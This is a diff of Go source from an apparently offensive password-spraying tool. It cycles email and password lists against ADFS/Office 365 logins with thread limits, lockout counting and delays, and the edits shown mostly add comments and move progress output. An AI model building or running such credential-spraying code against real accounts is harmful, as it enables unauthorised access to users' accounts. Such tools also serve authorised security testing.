@@ -68,7 +68,6 @@ func SprayADFSO365(
 		color.Red("[+] Invalid Credential : " + email + " - " + password)
 	}
 	go userChecked()
-	fmt.Printf("\rProgress: [%3d]", checkedUsers)
 }
 
 
@@ -106,7 +105,10 @@ func SprayEmailsADFSO365(
 		return
 	}
 	defer logFile.Close()
+
+	//1 email
 	if len(email) > 0 {
+		//1 password 
 		if len(password) > 0 {
 			SprayADFSO365(
 				domainName,
@@ -117,6 +119,7 @@ func SprayEmailsADFSO365(
 				logFile,
 			)
 		}
+		//passwords from file
 		if len(password) == 0 && len(passwordFilePath) > 0 {
 			var lockoutCount = 0
 			file, err := os.Open(passwordFilePath)
@@ -152,7 +155,9 @@ func SprayEmailsADFSO365(
 			}
 		}
 	}
+	// emails from file
 	if len(email) == 0 && len(emailFilePath) > 0 {
+		//1 password
 		if len(password) > 0 {
 			file, err := os.Open(emailFilePath)
 			if err != nil {
@@ -164,10 +169,8 @@ func SprayEmailsADFSO365(
 			// Создаем канал с размерами буфера, чтобы ограничить количество одновременно работающих горутин
 			concurrentLimit := threads
 			sem := make(chan struct{}, concurrentLimit)
-
 			// Для ожидания завершения всех горутин
 			var wg sync.WaitGroup
-
 			// Считываем строки из файла
 			for scanner.Scan() {
 				// Запускаем горутину для каждой строки
@@ -188,6 +191,8 @@ func SprayEmailsADFSO365(
 						logFile,
 					)
 
+					fmt.Printf("\rProgress: [%3d]", checkedUsers)
+
 				}(scanner.Text())
 
 				// Небольшая пауза для имитации задержки, можно настроить в зависимости от необходимости
@@ -207,6 +212,7 @@ func SprayEmailsADFSO365(
 				color.Red("[-] No Valid O365 Credentials Found !")
 			}
 		}
+		//passwords from file
 		if len(password) == 0 && len(passwordFilePath) > 0 {
 			lockoutCount := 0
 			passFile, err := os.Open(passwordFilePath)
@@ -251,8 +257,8 @@ func SprayEmailsADFSO365(
 
 						// Выполняем SprayADFSO365
 						SprayADFSO365(domainName, authURL, email, password, "file", logFile)
-
-						// Пауза для имитации задержки
+						fmt.Printf("\rProgress: [%3d:%3d]", password, checkedUsers)
+						// Пауза
 						time.Sleep(time.Duration(delay))
 					}(emailScanner.Text(), passScanner.Text())
 				}
